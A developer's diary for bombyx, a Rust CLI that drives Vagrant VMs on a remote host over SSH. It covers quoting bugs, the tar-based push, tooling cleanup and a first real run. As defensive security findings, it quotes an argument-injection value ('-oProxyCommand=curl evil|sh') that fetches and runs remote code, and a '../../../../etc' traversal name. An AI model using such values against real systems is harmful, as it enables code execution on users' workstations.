# Development Diary

Development diary for bombyx. Newest entries first.

### 2026-08-10

**The first real run**

bombyx has now driven a real VM on a real host, end to end.
Until today everything it did was proven only by unit tests
and by `--dry-run`, which shows the argv it would execute but
says nothing about whether the far end accepts it. That gap
was the oldest open item on the list, and closing it was worth
the effort: it confirmed the fixes and it found three things
the tests could not.

Set up frosti first: Ubuntu 24.04 with QEMU, libvirt, Vagrant
2.4.9 and vagrant-libvirt 0.12.2. Two things about that are
worth remembering. Ubuntu 24.04 does not package Vagrant at
all, so it has to come from HashiCorp's repository, and
`qemu-kvm` has been renamed `qemu-system-x86`. All of it is
written up in `docs/vm-host-setup.md`.

Then ran the whole surface against a throwaway project:
`up`, `status`, `shell`, `down`, `scratch`, `discard` and
`reset`, plus a second `up` to check that pushing twice is
safe, and a deliberate `discard ../../../../etc` to see the
name validation refuse it.

**Everything the reviewers made us fix, held up.** The most
satisfying one was the tilde. The remote shell resolved
`~/'vms/vmtest'` to `/home/igor/vms/vmtest`, and no directory
literally named `~` was created anywhere. That was the bug
that 82 unit tests had asserted *into* place, so seeing the
corrected form work against a real shell is the clearest
possible answer to why a real run was needed.

The rest of the push behaved as designed. After two pushes the
`Vagrantfile` sat directly in `~/vms/vmtest/`, with no nested
`vagrant/` directory, so the `scp -r` nesting problem is
genuinely gone. The VM's `.vagrant` identity directory
survived the second push with its domain id intact, which is
the `--exclude=./.vagrant` fix working. No push archive was
left behind on either end. Scratch VMs landed in
`~/vms/scratch/vmtest/pr-1234`, scoped by project as intended.
Exit codes propagated: `status` against a directory that did
not exist returned 1 and named the command that failed.

Vagrant's own log gave the neatest confirmation that the seam
works, describing the domain it built as
`Source: /home/igor/vms/vmtest/Vagrantfile` -- the file bombyx
had pushed, in the directory bombyx had created. And
`bombyx shell` reached all the way inside, printing
`vmtest / vagrant / 6.8.0-136-generic` from the guest.

**Three findings.** `discard` destroys the VM but leaves the
scratch directory sitting on the host, which makes the
README's claim that "nothing survives" untrue as written.
`reset` restores a snapshot called `fresh-install` that no
bombyx command ever creates, so on a new project it can only
fail -- it does fail cleanly, but the workflow has a hole in
it. Both are captured.

The third is more embarrassing and more useful.
`cargo xtask todo` writes entries as `**slug**` but its reader
only recognises that same bold form, and the four
hand-written entries in `docs/todo.md` use backticks instead.
So `todo list` has been silently omitting them since the day
they were written, `todo done first-real-run` could not find
the very item this work closed, and I reported that truncated
list as complete more than once without noticing it disagreed
with the file.

That is the same shape as the tilde bug and as the libvirt
check I wrote earlier today, which passed by connecting to a
per-user libvirt instance rather than the system one and so
proved nothing. Three times in two days, the failure was not
a red result. It was a green one that did not mean what it
appeared to mean.

### 2026-08-09

**Dropping the frontend tooling, and the npm awareness
behind it**

The CLI-only prune removed the web crate, the frontend and
the E2E suite, but left every piece of tooling that served
them: five `xtask` frontend modules, two dev-server shell
scripts, and a set of `.gitignore` blocks for Playwright and
Node. None of it could run -- there was nothing to point it
at -- so it was pure carrying cost, and `/template-sync` had
to reconcile all of it on every future sync.

Deleting that much is easy. The interesting part was the
second decision: whether the *npm awareness* in the tooling
that survived should go too. `cargo xtask audit` ran
`npm audit` only when `frontend/package.json` existed, and
the dependency-cooldown gate watched a
`frontend/package-lock.json` that will never appear. Both
already degraded cleanly to nothing. Keeping them cost
nothing at runtime; removing them meant deleting ~400 lines
of working, tested code.

Chose to remove. A half-supported second ecosystem is worse
than none: it reads as a capability the project has, and the
next person to touch `dep-age` would have to understand and
maintain a code path that cannot fire. `xtask` is now
Rust-only end to end -- `audit.rs` lost `NpmAudit` and its
runner, `dep_age.rs` lost `npm_version_date` / `npm_versions`
and the registry arm, and `gate.rs` lost `parse_npm_lock` and
its lockfile entry.

`Ecosystem` survives as a **single-variant enum**, and the
`cargo` argument stays on the command line
(`dep-age cargo serde`). That is deliberate: it keeps the
command stable and means adding a second registry later
needs no CLI change. It costs a one-armed `match` in three
places, which is the honest price of that option.

The one real trap was in `sync.rs`. Its `categorize` function
lists `frontend/` and `e2e/` as boilerplate prefixes, and
deleting them looks exactly as correct as everything else in
this change. It would have been wrong: those prefixes
classify paths in the **upstream rustbase diff**, which still
has a frontend, so removing them would silently drop upstream
frontend changes into the wrong bucket during
`/template-sync`. Left in place with a comment saying why,
since the next cleanup pass will be tempted the same way.

Verified the survivors against the live registry rather than
trusting the suite: `dep-age cargo serde` resolves and dates
correctly, `--latest-aged` still prints a pin target, `audit`
reports without an npm segment, `dep-age-check` is a clean
no-op, and `dep-age npm vite` now fails at the CLI boundary
with `invalid value 'npm' [possible values: cargo]` rather
than panicking.

Net: 784 lines deleted, and `cargo xtask --help` no longer
advertises four commands that could not work.

**Initial scaffold: a thin SSH control plane for agent VMs**

Started bombyx from the
[rustbase](https://github.com/breki/rustbase) template at
`f40582f` (v0.17.0), pruned to a CLI-only project -- the
template's web crate, frontend, E2E suite and deploy
subsystem are all gone, since bombyx has no runtime
services.

The shape of the tool follows from one decision: **the repo
is the source of truth, and the VM host holds only a
cache**. Each project keeps its `vagrant/` directory in its
own repo; `bombyx up` pushes it to the host and then runs
`vagrant` there over SSH. The host can therefore never
silently drift from the repo, and there is no state on the
host worth backing up.

The second decision is **wrap, don't reimplement**. bombyx
composes `ssh`, `scp`, `tar` and `vagrant` and nothing more.
If it breaks, `ssh frosti` and `vagrant up` by hand still
work -- which matters for a tool whose job is to be the only
thing standing between an agent and your credentials.

Four modules carry the work:

- `config.rs` parses `bombyx.toml` into typed `thiserror`
  errors and resolves the remote paths.
- `name.rs` holds `ScratchName`, a validated single path
  segment.
- `remote.rs` builds the command lines. Nothing here spawns
  a process: every function returns the argv to run.
- `plan.rs` maps an `Action` to the ordered command list.

Keeping the command construction pure is what makes
`--dry-run` trustworthy enough to develop against, and it is
why `plan.rs` lives in the library rather than in
`src/bin/` -- the project excludes `src/bin/` from coverage,
so policy sitting there would ship untested.

**The push mechanism took two attempts.** The obvious
`scp -r vagrant host:~/vms/phren/` is wrong, and wrong in a
way that only shows up on the *second* run: `scp -r` copies
*into* an existing destination, like `cp -r`. The first push
creates `~/vms/phren/vagrant`; the second creates
`~/vms/phren/vagrant/vagrant`, one level deeper every time.
Replaced it with a tar round-trip -- `tar -czf <a> -C <dir>
.` locally, `scp` the archive, then extract on the host. The
`-C <dir> .` is the load-bearing part: it archives the
directory's *contents*, so extraction lands files directly
in the target and repeated pushes overwrite in place.

`rsync` would have solved this more cleanly, and was
rejected on one ground: it is not present on a stock Windows
workstation, which is exactly where bombyx runs.

A related bug fell out of the same pass: `up` pushed to one
directory but ran `vagrant` in another, and `scratch` never
pushed at all, so it ran `vagrant up` in an empty directory,
guaranteed. Both now go through a shared `boot` helper.

**Then the reviewers took the scaffold apart.** Two
read-only agents (a security/correctness pass and a
craftsmanship pass) reviewed the initial commit and returned
23 findings between them, four of which they raised
independently. Enough of them were real, and load-bearing,
that fixing them before the first commit was the only honest
option. The ones worth recording:

*The default configuration did not work.* Every remote path
was single-quoted for safety, including the default
`remote_root = "~/vms"`. A POSIX shell does not expand `~`
inside single quotes, so `mkdir -p '~/vms/phren'` created a
directory *literally named* `~` under the login directory.
Meanwhile the `scp` destination interpolated the same path
unquoted, where `~` *does* expand -- so the archive landed
in the real `$HOME/vms/phren` while `vagrant up` ran in the
bogus tree with no Vagrantfile. Worse, the tests asserted
the quoted form, so they locked the bug in. The fix is
`quote_remote_path`, which leaves only the tilde outside the
quotes: `~/'vms/phren'`. Everything an attacker could
influence stays quoted, and the shell still expands the home
directory.

That one is the cleanest illustration of why the project's
Definition of Done requires a real VM host: the argv was
provably correct and provably useless.

*Two ways a cloned repo could run code on the workstation.*
`host` was passed as the first positional argument to `ssh`,
which has no `--` separator -- so a repo shipping `host =
"-oProxyCommand=curl evil|sh"` would execute that on *your
machine*, from a bare `bombyx status`, before any network
traffic. And the `scp` destination was the one path in the
module that skipped quoting entirely. Since `bombyx.toml`
travels inside a repo, it is attacker-controlled data the
moment you check out someone else's branch. Both are now
closed by allowlist validation in `Config::validate`. For a
tool whose entire purpose is containing untrusted code,
shipping either would have been embarrassing.

*Quoting is not validation.* The `scratch <name>` argument
was correctly quoted and still a traversal: `'../../../../etc'`
is a perfectly valid quoted string that still means `/etc`,
and the next step extracts a tar over it. `ScratchName` now
makes the safe shape a parsing step, so an invalid name
cannot reach a path at all. Related: scratch directories
omitted the project name, so `scratch pr-1` from two
projects resolved to the same directory on the host.

*The push clobbered the thing it promised not to.* The doc
comment and the README both stated that `.vagrant/` on the
host is left alone. But `tar -C <dir> .` includes dotfiles,
so a developer who had ever run `vagrant` locally shipped
their own `.vagrant/` and overwrote the host's machine
identity, orphaning the running VM. Now excluded explicitly,
with a test.

*Windows, the primary platform.* `std::env::temp_dir()`
returns `C:\Users\...`, and `scp` reads everything before
the first colon as a host name -- so `up` would have tried
to connect to a host called `C`. The archive now keeps a
bare file name and `tar`/`scp` run *in* its directory.

The remaining fixes were smaller: a fixed temp-file name
replaced by a per-run private directory (a co-user could
pre-create the path; two concurrent runs raced; and
`--dry-run` deleted the file, so a flag documented as
"print, don't run" had a destructive side effect); `&&`-
chained remote cleanup that skipped on failure and left a
corrupt archive in the boot directory; remote exit codes
flattened to 1; `deny_unknown_fields` so a typo'd key is
reported instead of silently defaulting; and a batch of
loose `contains`/`starts_with` assertions replaced by
full-value and ordering checks, which is what let several of
these through in the first place.

Ended at 96 tests and 100% coverage.

**Status:** the command surface works and is well covered,
but it *still* has not been driven against a real VM host.
`--dry-run` proves the argv, and this session is a good
lesson in how little that guarantees. That verification is
the next step and is required before any of this can be
called done.
